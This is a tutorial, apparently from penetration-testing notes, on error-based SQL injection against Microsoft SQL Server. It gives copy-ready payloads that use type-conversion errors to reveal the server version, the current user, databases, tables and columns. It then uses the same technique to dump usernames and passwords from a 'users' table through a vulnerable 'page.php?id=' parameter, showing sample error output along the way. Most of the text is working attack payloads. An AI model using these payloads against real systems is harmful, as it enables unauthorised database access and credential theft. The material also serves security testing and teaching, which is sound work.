# MSSQL Server

In MSSQL, the name of the database objects are revealed within errors. the user sa is the super admin and has access to the master database. The master database contains schemas of user-defined dbs.

First thing we can do to start exploting it is to discover the database version, we can trigger a type conversion error for that.



```text
99999 or 1 in (SELECT TOP 1 CAST(<FIELDNAME> as varchar(4096)) from <TABLENAME> WHERE <FIELDNAME> NOT IN (<LIST>)); --
```

* `99999` is a bogus value.
* `or 1 in` is the part of the query that will trigger the error, we are trying to find 1, an integer, within a varchar column.
* `CAST(<FIELDNAME> as varchar(4096))` is where we insert the column that we want to dump \(either user-based or special database column\). 
* `<FIELDNAME>` can also be a SQL function like `user_name()` or a variable like `@@version`
* `WHERE <FIELDNAME> NOT IN (<LIST>)` this part is used to dump the database and can be ommited or ajusted.

To retrieve the SQL version:

```text
99999 or 1 in (SELECT TOP 1 CAST(@@version as varchar(4096))) --
```

```text
[Microsoft] [SQL Server Native Client 10.0] [SQL Server]Conversion failed when converting the varchar value 'Microsoft SQL Server 2008 R2 (SP2) - 10.50.4000.0 (X64) Jun 28 2012 08:36:30 Copyright (c) Microsoft Corporation Express Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor) ' to data type int.
```

So, with all this information, how can I dump the entire database?

First of all, we need to discover some stuff:

* Current database username:

```text
99999 or 1 in (SELECT TOP 1 CAST(user_name() as varchar(4096))) --
```

\*user\_name\(\) is a MSSQL function which returns the current user.

* Current databases and all other databases the user can read

```text
99999 or 1 in (SELECT TOP 1 CAST(db_name(0) as varchar(4096))) --
99999 or 1 in (SELECT TOP 1 CAST(db_name(1) as varchar(4096))) --
99999 or 1 in (SELECT TOP 1 CAST(db_name(2) as varchar(4096))) --
```

\*db\_name\(\) functoin accesses the master..sysdatabases table, which stores all databases installed. We can only see dbs that the user has rights to.

* The tables into a given database

To enumerate all tables in a database, we can use the following payload:

```text
9999 or 1 in (SELECT TOP 1 CAST(name as varchar (4096)) FROM <database name>..sysobjects WHERE xtype='U' and name NOT IN (<known table list>)); --
```

* `xtype means='U'` means we only want user-defined tables
* `name NOT IN ('<know table list>')` name is a column of the sysobjects table. Everytime we find a new table we will append it to the NOT IN list. This is needed because the error display only the first table name.
* The columns of a given table

After retrieving the tables, we can retrieve the columns using the following payload:

```text
9999 or 1 in (SELECT TOP 1 CAST (<db name>..syscolumns.name as varchar (4096)) FROM <db name>..syscolumns,<db name>..sysobjects WHERE <db name>..syscolumns.id=<db name>..sysobjects.id AND <dbname>. .sysobjects.name=<table name> AND <db name>..syscolumns.name NOT IN (<known column list>)); --
```

* `<db name>` is the name of database we're working on
* `<table name>` is the table which we're trying to find the columns
* `<known column list>` list of columns we already discovered

Finally, to dump the database, we can use the following query:

```text
9999 or 1 in (SELECT TOP 1 CAST (<column name> as varchar (4096) ) FROM <db name>..<table name> WHERE <column name> NOT IN (<retrieved data list>)); -- -
```

## Example

Lets say we have an exploitable page.php?id=1 and identified the table users in the database cms

This table contains:

* id - integer
* username - varchar
* password - varchar

To retrieve the ID values, we can use the following payload:

```text
9999 or 1 IN (SELECT TOP 1 CAST(id as varchar) %2bchar(64) FROM cms..users WHERE id NOT IN ('')); -- -
```

We need to concatenate the id value with @ to make sure the selected value has the data type varchar, this makes the error possible:

```text
[Microsoft] [SQL Server Native Client 10.0] [SQL Server]Conversion failed when converting the varchar value '1@' to data type int.
```

Proceed to filter out `1` and query again:

```text
9999 OR 1 IN (SELECT TOP 1 CAST(id as varchar) %2bchar (64) FROM cms..users WHERE id NOT IN ('1')); -- -
```

So, the resulting error is something like

```text
Microsoft] [SQL Server Native Client 10.0] [SQL Server]Conversion failed when converting the varchar value '2@' to data type int.
```

After enumerating the ID, basically request the username or/and password:

```text
9999 OR 1 IN (SELECT TOP 1 CAST(username as varchar) FROM cms..users WHERE id=1); -- -
9999 OR 1 IN (SELECT TOP 1 CAST(password as varchar) FROM cms..users WHERE id=1); -- -
9999 OR 1 IN (SELECT username%2bchar(64) %2bpassword FROM cms..users WHERE id=1); -- -
```

